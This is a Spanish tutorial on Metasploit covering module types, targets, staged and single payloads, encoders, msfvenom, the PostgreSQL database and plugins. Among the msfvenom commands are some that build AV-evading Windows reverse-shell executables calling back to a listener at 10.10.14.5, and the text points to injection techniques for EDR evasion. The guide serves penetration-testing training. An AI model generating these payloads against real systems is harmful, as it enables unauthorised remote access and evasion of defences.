# Módulos, Targets, Payloads y Encoders

### Módulos

Los módulos son los bloques de construcción de Metasploit. Cada módulo es un script Ruby independiente que realiza una función específica.

#### Tipos de módulos

| Tipo          | Ruta         | Descripción                                                   |
| ------------- | ------------ | ------------------------------------------------------------- |
| **Exploit**   | `exploit/`   | Explotan una vulnerabilidad específica para obtener acceso    |
| **Auxiliary** | `auxiliary/` | Escaneo, enumeración, fuzzing, DoS — sin payload              |
| **Post**      | `post/`      | Post-explotación: escalada, pivoting, dump de credenciales    |
| **Payload**   | `payload/`   | El código que se ejecuta en el objetivo tras la explotación   |
| **Encoder**   | `encoder/`   | Codifican el payload para evadir detecciones de AV/IDS        |
| **NOP**       | `nop/`       | Instrucciones NOP para padding en exploits de buffer overflow |
| **Evasion**   | `evasion/`   | Generan ejecutables con técnicas de evasión de AV             |

#### Rankings de módulos

Los módulos tienen un ranking que indica su fiabilidad:

| Ranking       | Descripción                                            |
| ------------- | ------------------------------------------------------ |
| **Excellent** | No daña el servicio objetivo ni genera inestabilidad   |
| **Great**     | Tiene un target por defecto y detección automática     |
| **Good**      | Tiene target por defecto pero sin detección automática |
| **Normal**    | Fiable pero sin detección automática del target        |
| **Average**   | Puede no funcionar siempre                             |
| **Low**       | Casi siempre da problemas                              |
| **Manual**    | Requiere configuración específica manual               |

#### Cargar un módulo externo

Si se descarga un módulo de GitHub que no está en Metasploit:

```bash
# Copiar al directorio correcto
cp nuevo_modulo.rb /usr/share/metasploit-framework/modules/exploits/linux/http/

# Recargar módulos sin reiniciar
msf6 > reload_all
# o
msf6 > loadpath /ruta/al/directorio/
```

### Targets

Los targets definen las versiones específicas del sistema operativo o aplicación para las que está diseñado el exploit. Distintas versiones del mismo software pueden requerir configuraciones de memoria o offsets diferentes.

```bash
# Ver los targets disponibles para un módulo
msf6 exploit(windows/smb/ms08_067_netapi) > show targets

Exploit targets:
   Id  Name
   --  ----
   0   Automatic Targeting
   1   Windows 2000 Universal
   2   Windows XP SP0/SP1 Universal
   3   Windows XP SP2 English (AlwaysOn NX)
   4   Windows XP SP3 English (AlwaysOn NX)
   ...

# Seleccionar un target específico
msf6 > set TARGET 3
```

Cuando se usa `TARGET 0` (Automatic), Metasploit intenta detectar automáticamente la versión del objetivo. En general es suficiente, pero si el exploit falla, probar con un target específico.

### Payloads

Los payloads son el código que se ejecuta en el objetivo tras una explotación exitosa. En Metasploit se distinguen tres tipos:

#### Singles (payloads independientes)

Payloads completamente autónomos que no necesitan comunicación adicional. Son pequeños y limitados en funcionalidad. Se reconocen por tener `_` en lugar de `/` después del nombre de la plataforma.

```
windows/shell_reverse_tcp      ← Single (todo en uno)
windows/shell/reverse_tcp      ← Staged (stager + stage separados)
```

#### Stagers

Son la primera parte de un staged payload. Son pequeños y su única función es establecer la conexión de red y descargar el stage completo. Ejemplo: `windows/meterpreter/reverse_tcp` — la parte `/reverse_tcp` es el stager.

#### Stages

La segunda parte del staged payload. Se descarga a través del stager y proporciona la funcionalidad completa (Meterpreter, shell interactiva...). Ejemplo: en `windows/meterpreter/reverse_tcp`, la parte `meterpreter` es el stage.

#### Seleccionar y configurar el payload

```bash
# Ver todos los payloads compatibles con el módulo activo
show payloads

# Ver payloads disponibles para una plataforma
msf6 > show payloads | grep windows/x64/meterpreter

# Seleccionar un payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set PAYLOAD linux/x64/shell_reverse_tcp

# Payloads más usados por situación:
# Windows — shell básica:    windows/x64/shell_reverse_tcp
# Windows — Meterpreter:     windows/x64/meterpreter/reverse_tcp
# Linux — shell básica:      linux/x64/shell_reverse_tcp
# Linux — Meterpreter:       linux/x64/meterpreter/reverse_tcp
# Multi-plataforma:          java/meterpreter/reverse_tcp

# Ver opciones específicas del payload seleccionado
show options
```

### Encoders

Los encoders transforman el payload para que no sea reconocido por firmas de AV/IDS. No están diseñados para evasión avanzada de EDRs modernos, pero pueden ayudar contra AV con firmas antiguas.

```bash
# Ver encoders disponibles
show encoders

# Los más usados:
# x86/shikata_ga_nai    → polimórfico, muy usado para x86
# x64/xor               → XOR simple para x64
# x86/xor_dynamic       → XOR dinámico

# Ver el ranking de cada encoder
msf6 > show encoders

Encoders
========

   #   Name                          Rank       Description
   -   ----                          ----       -----------
   0   cmd/brace                     low        Bash Brace Expansion
   1   cmd/echo                      good       Echo Command Encoder
   2   cmd/generic_sh                manual     Generic Shell Variable
   3   x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback
   4   x64/xor                       normal     XOR Encoder
```

#### Usar encoders con MSFvenom

```bash
# Aplicar encoder con una iteración
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 \
    -e x86/shikata_ga_nai \
    -f exe > payload.exe

# Múltiples iteraciones (mayor ofuscación)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 \
    -e x86/shikata_ga_nai -i 10 \
    -f exe > payload_encoded.exe

# Múltiples encoders encadenados
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 \
    -e x86/shikata_ga_nai -i 5 \
    -e x86/countdown -i 3 \
    -f exe > payload_multi.exe
```

> Los encoders básicos como `shikata_ga_nai` son bien conocidos por los AV modernos. Para evasión real en entornos con EDR activo se necesitan técnicas más avanzadas (custom shellcode loaders, process injection, obfuscation frameworks).

### Databases en Metasploit

Metasploit puede usar **PostgreSQL** para almacenar resultados de escaneos, hosts descubiertos, credenciales y sesiones. Facilita el trabajo en engagements largos y permite retomar el trabajo donde se dejó.

#### Configuración inicial

```bash
# Iniciar PostgreSQL
sudo systemctl start postgresql

# Inicializar la base de datos de Metasploit
sudo msfdb init

# Verificar el estado de la conexión
msf6 > db_status
# [*] Connected to msf. Connection type: postgresql.
```

#### Gestión de workspaces

Los workspaces permiten organizar los datos por proyecto o cliente:

```bash
# Ver workspaces disponibles
workspace
workspace -l

# Crear un workspace nuevo
workspace -a cliente_empresa

# Cambiar al workspace
workspace cliente_empresa

# Eliminar un workspace
workspace -d nombre

# Renombrar
workspace -r nombre_viejo nombre_nuevo
```

#### Comandos de base de datos

```bash
# Ver hosts descubiertos
hosts
hosts -R      # importar hosts al módulo activo como RHOSTS

# Ver servicios descubiertos
services
services -p 445    # filtrar por puerto
services -R        # importar como RHOSTS

# Ver credenciales capturadas
creds
loot             # archivos y datos capturados

# Importar resultados de un escaneo Nmap
db_import scan.xml

# Lanzar Nmap y guardar directamente en la DB
db_nmap -sC -sV 10.10.10.0/24

# Exportar todo el workspace
db_export -f xml -a backup.xml
```

### Plugins y Mixins

#### Plugins

Los plugins extienden la funcionalidad de Metasploit con características adicionales. Se cargan durante la sesión de msfconsole.

```bash
# Ver plugins disponibles
ls /usr/share/metasploit-framework/plugins/

# Cargar un plugin
msf6 > load nessus
msf6 > load pentest
msf6 > load session_notifier

# Ver comandos añadidos por un plugin cargado
msf6 > ?

# Descargar un plugin
msf6 > unload nessus

# Ver plugins cargados actualmente
msf6 > plugin

# Plugins útiles:
# nessus         → integración con Nessus
# pentest        → comandos adicionales de pentest
# auto_add_route → añade rutas automáticamente para pivoting
# socket_logger  → registra todo el tráfico de red
```

#### Mixins

Los Mixins son módulos Ruby que se incluyen en los módulos de Metasploit para añadir funcionalidad común sin duplicar código. Son relevantes principalmente para quien escribe módulos propios. Los más comunes que se verán en el código de los módulos:

| Mixin                               | Funcionalidad que añade         |
| ----------------------------------- | ------------------------------- |
| `Msf::Exploit::Remote::Tcp`         | Conexiones TCP                  |
| `Msf::Exploit::Remote::HttpClient`  | Peticiones HTTP                 |
| `Msf::Exploit::Remote::SMB::Client` | Interacción con SMB             |
| `Msf::Auxiliary::Scanner`           | Escaneo de múltiples hosts      |
| `Msf::Auxiliary::AuthBrute`         | Brute force de autenticación    |
| `Msf::Post::Windows::Priv`          | Escalada de privilegios Windows |

> La base de datos de Metasploit es especialmente útil cuando se trabaja con redes grandes. `db_nmap` lanza el escaneo y registra automáticamente todos los hosts y servicios — luego `hosts -R` los carga como targets del módulo activo en un solo comando.
